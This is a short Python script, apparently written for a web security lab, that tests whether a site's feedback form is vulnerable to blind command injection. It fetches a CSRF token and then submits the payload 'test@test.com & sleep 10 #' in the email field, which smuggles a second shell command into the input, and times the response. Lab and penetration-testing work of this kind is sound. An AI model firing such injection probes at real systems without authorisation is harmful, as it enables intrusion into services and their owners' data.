import sys
import requests 
from bs4 import BeautifulSoup
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# to avoid warnings

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # sending requests to burpsuit (not complusury)

# to get csrf token from the request form
def get_csrf_token(s, url):
    path = 'feedback'
    req = s.get(url+path, verify = False, proxies = proxies)
    soup = BeautifulSoup(req.text, 'html.parser') # this will store feedback page in html format
    csrf = soup.find("input")['value'] # to find first input occuresnce
    return csrf

# Command injection
def check_command_injection(s, url):
    feedback_path = 'feedback/submit'
    command_injection = 'test@test.com & sleep 10 #'
    csrf_token = get_csrf_token(s, url)

    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}

    res = s.post(url+feedback_path, verify=False, data=data, proxies = proxies)
    if (res.elapsed.total_seconds() >=10):
        print("(+) Email field vulnerable to time-based command injection!")
    else:
        print("(-) Email field not vulnerable to time-based command injection")

def main():
    if len(sys.argv) != 2 :
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:
        url = sys.argv[1]
        print("(+) Checking if email parameter is vulnerable to time-base command injection...")

        s = requests.Session()
        check_command_injection(s, url)

if __name__ == "__main__":
    main()